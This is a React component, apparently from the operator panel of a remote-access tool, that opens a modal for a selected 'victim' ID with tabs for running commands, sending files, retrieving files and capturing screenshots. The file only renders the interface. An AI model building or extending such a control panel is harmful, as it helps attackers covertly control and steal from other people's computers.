import React, { useContext, useState } from 'react';
import { PanelContext } from '../../context/PanelContext';
import TabComandos from './TabComandos';
import TabEnviarArchivo from './TabEnviarArchivo';
import TabCaptura from './TabCaptura';
import TabRecuperarArchivo from './TabRecuperarArchivo';
import TabCarpetaArchivos from './TabCarpetaArchivos';

function ModalTab({ modalShow, cerrarModal }) {
    const { idVictima } = useContext(PanelContext);


    return (
        <>

            {modalShow && (
                <div className="modal-backdrop fade show"></div>
            )}

            <div className={` modal bd-example-modal-lg fade${modalShow ? ' show' : ''}`} id="staticBackdrop" style={{ display: modalShow ? 'block' : 'none' }} aria-labelledby="staticBackdropLabel" aria-hidden={!modalShow}>
                <div className="modal-dialog modal-lg">
                    <div className="modal-content">
                        <form >
                            <div className="modal-header">
                                <h5 className="modal-title" id="staticBackdropLabel">Realizar Accion en: <span style={{ fontSize: '14px' }}>{idVictima}</span>
                                </h5>
                                <button type="button" className="btn-close" onClick={cerrarModal} aria-label="Close"></button>
                            </div>
                            <div className="modal-body">

                                <ul className="nav nav-tabs" id="myTab" role="tablist">

                                    <li className="nav-item" role="presentation">
                                        <button className="nav-link active" id="comandos-tab" data-bs-toggle="tab" data-bs-target="#comandos-tab-pane" type="button" role="tab" aria-controls="comandos-tab-pane" aria-selected="true">Comandos</button>
                                    </li>


                                    <li className="nav-item" role="presentation">
                                        <button className="nav-link" id="enviar-archivo-tab" data-bs-toggle="tab" data-bs-target="#enviar-archivo-tab-pane" type="button" role="tab" aria-controls="enviar-archivo-tab-pane" aria-selected="false">enviar archivos</button>
                                    </li>

                                    <li className="nav-item" role="presentation">
                                        <button className="nav-link" id="recuperar-archivo-tab" data-bs-toggle="tab" data-bs-target="#recuperar-archivo-tab-pane" type="button" role="tab" aria-controls="recuperar-archivo-tab-pane" aria-selected="false">Recuperar archivo</button>
                                    </li>

                                    <li className="nav-item" role="presentation">
                                        <button className="nav-link" id="captura-tab" data-bs-toggle="tab" data-bs-target="#captura-tab-pane" type="button" role="tab" aria-controls="captura-tab-pane" aria-selected="false">Captura de pantalla</button>
                                    </li>
                                </ul>

                                <div className="tab-content" id="myTabContent">
                                    <div className="tab-pane fade show active" id="comandos-tab-pane" role="tabpanel" aria-labelledby="comandos-tab" tabIndex="0">
                                        <br />
                                        <TabComandos />
                                    </div>

                                    <div className="tab-pane fade" id="enviar-archivo-tab-pane" role="tabpanel" aria-labelledby="enviar-archivo-tab" tabIndex="0">
                                        <br />
                                        <TabEnviarArchivo />
                                    </div>

                                    <div className="tab-pane fade" id="recuperar-archivo-tab-pane" role="tabpanel" aria-labelledby="recuperar-archivo-tab" tabIndex="0">
                                        <br />
                                        <TabRecuperarArchivo />
                                    </div>


                                    <div className="tab-pane fade" id="captura-tab-pane" role="tabpanel" aria-labelledby="captura-tab" tabIndex="0">
                                        <br />
                                        <TabCaptura />
                                    </div>
                                </div>





                            </div>
                            <div className="modal-footer">
                                <button type="button" className="btn btn-secondary" onClick={cerrarModal}>Cerrar</button>
                            </div>

                        </form>
                    </div>
                </div>
            </div>



        </>
    )
}

export default ModalTab